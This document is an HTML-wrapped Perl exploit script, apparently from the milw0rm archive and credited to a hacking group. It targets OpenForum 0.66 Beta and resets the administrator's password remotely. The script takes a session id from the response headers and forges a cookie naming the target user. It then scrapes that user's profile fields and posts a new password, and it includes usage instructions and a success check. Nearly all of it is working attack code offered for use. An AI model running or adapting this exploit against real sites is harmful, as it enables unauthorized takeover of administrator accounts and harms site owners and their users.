<html><head><title>OpenForum 0.66 Beta Remote Reset Admin Password Exploit</title></head><pre>#!/usr/bin/perl -w
#========================================================
#OpenForum 0.66 Beta Remote Reset Admin Password Exploit
#========================================================
#
#  ,--^----------,--------,-----,-------^--,
#  |  |||||||||   `--------'    |	   O	  .. CWH Underground Hacking Team ..
#  `+---------------------------^----------|
#   `\_,-------, _________________________|
#      / XXXXXX /`|     /
#     / XXXXXX /  `\   /
#    / XXXXXX /\______(
#   / XXXXXX /           
#  / XXXXXX /
# (________(             
#  `------'
#
#AUTHOR : CWH Underground
#DATE : 29 November 2008
#SITE : cwh.citec.us
#
#
#####################################################
#APPLICATION : OpenForum
#VERSION : 0.66 Beta
#DOWNLOAD : http://downloads.sourceforge.net/openforum/openforum066.zip
######################################################
#######################################################################################
#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
#######################################################################################

use LWP;
use HTTP::Request;
use HTTP::Request::Common;

print &quot;\n==================================================\n&quot;;
print &quot; Openforum 0.66 beta Remote Reset Admin Password exploit \n&quot;;
print &quot; \n&quot;;
print &quot; Discovered By CWH Underground \n&quot;;
print &quot;==================================================\n&quot;;
print &quot; \n&quot;;
print &quot; ,--^----------,--------,-----,-------^--, \n&quot;;
print &quot; | ||||||||| `--------' | O \n&quot;;
print &quot; `+---------------------------^----------| \n&quot;;
print &quot; `\_,-------, _________________________| \n&quot;;
print &quot; / XXXXXX /`| / \n&quot;;
print &quot; / XXXXXX / `\ / \n&quot;;
print &quot; / XXXXXX /\______( \n&quot;;
print &quot; / XXXXXX / \n&quot;;
print &quot; / XXXXXX / .. CWH Underground Hacking Team .. \n&quot;;
print &quot; (________( \n&quot;;
print &quot; `------' \n&quot;;
print &quot; \n&quot;;

if ($#ARGV ne 2) {
	print &quot;Usage: ./openforum.pl &lt;url-to-index-page&gt; &lt;user account&gt; &lt;new password&gt;\n&quot;;
	print &quot;Ex. ./openforum.pl http://www.target.com/openforum/index.php admin cwhpass\n&quot;;
	exit();
}

$url = $ARGV[0];
$user = $ARGV[1];
$newpass = $ARGV[2];

if ($url !~ /^http:\/\//) {
	$url = &quot;http://&quot;.$url;
}

print &quot;[+] Target url: &quot;.$url.&quot;\n\n&quot;;

$req = HTTP::Request-&gt;new (GET =&gt; $url);
$req-&gt;header (User_Agent =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
$req-&gt;header (Accept =&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
$req-&gt;header (Accept_Language =&gt; 'en-us,en;q=0.5');

$ua = LWP::UserAgent-&gt;new;
$response = $ua-&gt;request ($req);

if ($response-&gt;code ne 200) {
	print &quot;Error: Could not request for index page\n&quot;;
	exit ();
}

$header = $response-&gt;headers-&gt;as_string;

($sessid) = $header =~ /sessid=(.+)\n/;
print &quot;:: Retreive session id ::\n&quot;;
print &quot;[+] &quot;.$sessid.&quot;\n\n&quot;;

$url =~ s/index\.php$/profile.php?user=$user/;

#print $url;



$req = HTTP::Request-&gt;new (GET =&gt; $url);
$req-&gt;header (User_Agent =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
$req-&gt;header (Accept =&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
$req-&gt;header (Accept_Language =&gt; 'en-us,en;q=0.5');
$req-&gt;header (Cookie =&gt; 'sessid='.$sessid.'; userid='.$user);

$response = $ua-&gt;request ($req);
if ($response-&gt;code ne 200) {
	print &quot;Error: Could not request for &quot;.$user.&quot;'s profile page\n&quot;;
	exit ();
}

$content = $response-&gt;content;
$update = &quot;1&quot;;
$adminaction = &quot;&quot;;
($email) = $content =~ /\&quot;email\&quot; value=\&quot;(.*?)\&quot;/;
($signature) = $content =~ /\&quot;signature\&quot;&gt;(.*?)&lt;\/textarea&gt;/;
$day = &quot;&quot;;
$month = &quot;&quot;;
$year = &quot;&quot;;
($website) = $content =~ /\&quot;website\&quot; value=\&quot;(.*?)\&quot;/;
($name) = $content =~ /\&quot;name\&quot; value=\&quot;(.*?)\&quot;/;
($phone) = $content =~ /\&quot;phone\&quot; value=\&quot;(.*?)\&quot;/;
($city) = $content =~ /\&quot;city\&quot; value=\&quot;(.*?)\&quot;/;
($location) = $content =~ /\&quot;location\&quot; value=\&quot;(.*?)\&quot;/;
$sytle = &quot;&quot;;
$submit = &quot;Update!&quot;;


print &quot;:: Update new password ::\n\n&quot;;
$url =~ s/\?user=admin//;


$response = $ua-&gt;request (POST $url,
		User_Agent =&gt; 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18',
		Accept =&gt; 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
		Accept_Language =&gt; 'en-us,en;q=0.5',
		Cookie =&gt; 'sessid='.$sessid.'; userid='.$user,
		Content_Type =&gt; 'form-data',
		Content =&gt; [update =&gt; $update, user =&gt; $user, adminaction =&gt; '', email =&gt; $email, signature =&gt; $signature, website =&gt; $website, name =&gt; $name,
				phone =&gt; $phone, city =&gt; $city, location =&gt; $location, password =&gt; $newpass, submit =&gt; $submit]
);

if ($response-&gt;code ne 200) {
	print &quot;Error: Could not request for profile page\n&quot;;
	exit ();
}

$content = $response-&gt;content;

if ($content =~ /&lt;br&gt;updated&lt;br&gt;&lt;table width=\&quot;100%\&quot;&gt;/) {
	print &quot;[+] Exploit Success\n&quot;;
	print &quot;[+] New admin's password: &quot;.$newpass.&quot;\n&quot;;
}
else
{
	print &quot;[+] Exploit Failed\n&quot;;
}

# milw0rm.com [2008-11-29]</pre></html>